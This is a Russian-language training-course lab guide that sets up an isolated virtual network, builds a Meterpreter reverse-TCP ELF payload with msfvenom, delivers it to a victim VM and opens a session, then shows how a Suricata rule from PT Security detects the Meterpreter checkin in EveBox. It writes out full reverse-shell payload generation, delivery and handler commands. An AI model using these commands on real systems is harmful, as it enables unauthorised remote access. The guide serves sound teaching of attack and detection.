# Guided Case 2.21 — Metasploit

> [!info] Путь в курсе
> Глава 2: Сети и сетевая безопасность / Часть 3. Кибератаки и защита от них / Фрэймворки постэксплуатации

## Стенд / введение

Создадим виртуальную инфраструктуру в соответствии с схемой ниже:

![](../../_images/4cf6128efbe7.webp)

Первая сеть **192.168.1.0/24**, которая состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether1**:
   
   - IP-адрес - 192.168.1.1
   - Маска - 255.255.255.0
2. **Debian-машина** с **GUI** и интерфейсом **enp0s3**. Установка виртуальной машины аналогична разделу **Установка Debian 12 **из Главы 1, только при создании требуется загрузить графический интерфейс.
   
   - IP-адрес - 192.168.1.252
   - Маска - 255.255.255.0
   - Сетевой шлюз - 192.168.1.1

Вторая сеть **192.168.2.0/24** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether2**:
   
   - IP-адрес - 192.168.2.1
   - Маска - 255.255.255.0
2. **VictimX** с интерфейсом **enp0s3**. Установка виртуальной машины аналогична разделу **Установка Debian 12 **из Главы 1
   
   - IP-адрес - назначается по DHCP
   - Маска - назначается по DHCP
   - Сетевой шлюз - 192.168.2.1

Третья сеть **10.0.0.0/8** состоит из:

1. маршрутизатор **MikroTik** с интерфейсом **ether3**:
   
   - IP-адрес - 10.0.0.1
   - Маска - 255.0.0.0
2. **Suricata** с интерфейсом **enp0s3**:
   
   - IP-адрес - 10.255.255.254
   - Маска - 255.0.0.0
   - Сетевой шлюз - 10.0.0.1

> У виртуальных машин должно быть по 1 сетевому адаптеру VirtualBox в режиме **Internal Network**

На атакующей машине установим **Metasploit** следующими командами:

1. `sudo apt install -y curl gpg`
2. `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall`
3. `sudo chmod 755 msfinstall`
4. `./msfinstall`

> **Metasploit** - это фреймворк для тестирования безопасности, который используется для поиска, проверки и эксплуатации уязвимостей в системах, сервисах и приложениях.

Проверим, установился ли **Metasploit** командой `msfconsole -v`

![](../../_images/ea913a89e8a0.webp)

Видим, что **Metasploit** установился, можно с ним работать. Сгенерируем полезную нагрузку командой **msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.252 LPORT=4444 -f elf -o ./shell.elf**, где:

- **msfvenom** - вызов утилиты
- **-p linux/x86/meterpreter/reverse_tcp** - флаг **p** указывает какую нагрузку хотим сгенерировать, **linux/x86** - архитектура, **meterpreter** - продвинутая оболочка с командами, **reverse_tcp** - тип соединения
- **LHOST=192.168.1.252** - адрес атакующей машины
- **LPORT=4444** - TCP-порт на атакующей машине для подключения
- **-f elf** - флаг f указывает на формат выходного файла, для линукс характерен формат исполняемых файлов elf
- **-o ./shell.elf** - флаг o указывает путь и имя выходного файла

> **msfvenom** - это утилита командной строки из состава Metasploit Framework, предназначенная для создания и настройки payload’ов в различных форматах. Она используется в рамках тестирования на проникновение для проверки возможности выполнения полезной нагрузки на целевой системе.

![](../../_images/3b757a9b5fdb.webp)

После создания файла необходимо его перенести на машину-жертву следующим способом:

1. `python -m http.server 8888` - запускаем python сервер в директории с полезной нагрузкой, где:
   
   - **-m http.server** - указывает на запуск встроенной библиотеки http.server
   - **8888** - порт, на котором будет запущен сервер
2. `wget http://192.168.1.252:8888/shell.elf `- на машине-жервте выполняем загрузку файла в домашнюю директорию
   
   - **wget** - утилита для скачивания файлов
   - **http://192.168.1.252:8888/shell.elf** - местоположение файла на поднятом сервере python

После переноса сделаем файл исполняемым с помощью команды `chmod +x ./shell.elf`

![](../../_images/53d872f5b9cd.webp)

Теперь запустим **Metasploit** командой `msfconsole`

![](../../_images/98f7fa7b4a9e.webp)

> В данном кейсе используется Metasploit **v6.4.135**

Появится приглашение для ввода вида **msf >**. Затем выполним команды:

- `use exploit/multi/handler` - загружает модуль-обработчик для принятия входящих соединений
- `set payload linux/x86/meterpreter/reverse_tcp` - указывает, какой тип нагрузки будет к нему подключаться

![](../../_images/d83230c559a0.webp)

Также надо установить адрес и порт, на котором обработчик будет ожидать подключение:

- `set LHOST 0.0.0.0` - слушать на всех сетевых интерфейсах
- `set LPORT 4444` - слушать на порту 4444

![](../../_images/ba3130036bda.webp)

Запустим на машине-жертве эксплойт командой `./shell.elf`

![](../../_images/3747b6d99422.webp)

Далее на атакующей машине запустим эксплойт `exploit -j`

![](../../_images/0cd329381032.webp)

В терминале должно появится уведомление, что запущена сессия. Перейдем в данную сессию с помощью команды `sessions -i 1`

![](../../_images/c8698c76eba1.webp)

Теперь есть доступ к машине-жертве. Воспользуемся этим и узнаем операционную систему на узле

![](../../_images/da2863b9eb39.webp)

Теперь воспользуемся командой **shell**, чтобы работать с обычным интерпретатором по типу bash. Дальше проверим, какие есть права у пользователя командой **id**

![](../../_images/2f40343c3c58.webp)

Посмотрим на логи в EveBox, которые появились в записях во время атаки

![](../../_images/cbcf51f84373.webp)

В EveBox сработало правило из открытого набора [**PT Rules**](https://rules.ptsecurity.com/view/ptopen-all.rules):

```
alert tcp any any -> any any (msg: "SHELL [PTsecurity] Meterpreter Checkin"; flow: established, to_server; dsize: 397; stream_size: server, >, 1024; stream_size: client, =, 398; content: !"|00 00 00 00|"; depth: 112; byte_extract: 1, 0, first; byte_test: 1, !=, first, 1; byte_test: 1, !=, first, 2; byte_extract: 3, 0, pattern; byte_test: 3, !=, pattern, 4; byte_test: 3, =, pattern, 20; byte_test: 3, =, pattern, 28; byte_test: 3, =, pattern, 32; byte_test: 3, =, pattern, 56; byte_test: 3, =, pattern, 64; byte_test: 3, =, pattern, 68; byte_test: 3, =, pattern, 108; reference: url, https://www.virustotal.com/gui/file/13617156919d3ef0243d66b21e041635ac158b8aa73ace383c383db74db422fd/detection; reference: url, rules.ptsecurity.com; classtype: attempted-admin; sid: 10011768; rev: 3;)
```

Правило, которое зафиксировало угрозу, настроено на обнаружение сетевой активности Meterpreter на этапе первичной регистрации зараженного хоста на управляющем сервере. Обнаружение строится на строгой последовательности проверок метаданных TCP-сессии, размеров потоков данных и внутренней структуры полезной нагрузки пакета. Сначала система проверяет, что TCP-соединение уже установлено и данные направляются в сторону сервера, затем происходит анализ ограничений по размеру: объем данных текущего пакета должен быть строго равен **397** байтам, общий объем отправленных клиентом данных в сессии составляет **398** байт, а сервер к этому моменту уже должен был передать клиенту более **1024** байт. Далее осуществляется глубокий анализ содержимого пакета: в первых **112** байтах проверяется отсутствие четырех нулевых байт подряд, после этого из начала пакета с помощью ключевых слов **byte_extract** и **byte_test** последовательно извлекаются технические маркеры. Правило считывает первый байт, проверяя, что он не равен значениям 1 и 2, а затем извлекает 3-байтовый паттерн структуры данных Meterpreter. Система генерирует предупреждение об атаке только в том случае, если этот паттерн не равен 4, но при этом строго соответствует одному из специфичных для протокола Metasploit внутренних идентификаторов.

Откроем карточку инцидента и изучим его подробнее

![](../../_images/68d26f8fa731.webp)

Видим следующую информацию:

- **Timestamp** - 2026-06-24 13:46:46.580
- **Protocol** - TCP
- **Source** - 192.168.2.249, порт отправки: 52562
- **Destination** - 192.168.1.252, порт назначения: 4444
- **In Interface** - dummy0
- **Signature** - SHELL [PTsecurity] Meterpreter Checkin
- **Category** - попытка получения прав администратора (Attempted Administrator Privilege Gain)
- **Severity** - 1, является наивысшим уровнем опасности
- **Action** - allowed, трафик был пропущен системой обнаружения вторжений, так как она работает в режиме мониторинга

Полезная нагрузка отправила на управляющий сервер **284** пакета, передав **21 298** байт данных, в ответ от сервера на хост жертвы пришло **57** пакетов общим объемом **79 278** байт. Подключение осуществлялось напрямую на порт **4444**, который является классическим портом по умолчанию для обратного подключения с узла жертвы на узел атакующего, на котором развернут **Metasploit**. Данная сетевая сессия подтверждает успешный этап взаимодействия и стабильный процесс обмена данными с полезной нагрузкой Meterpreter в скомпрометированной системе.
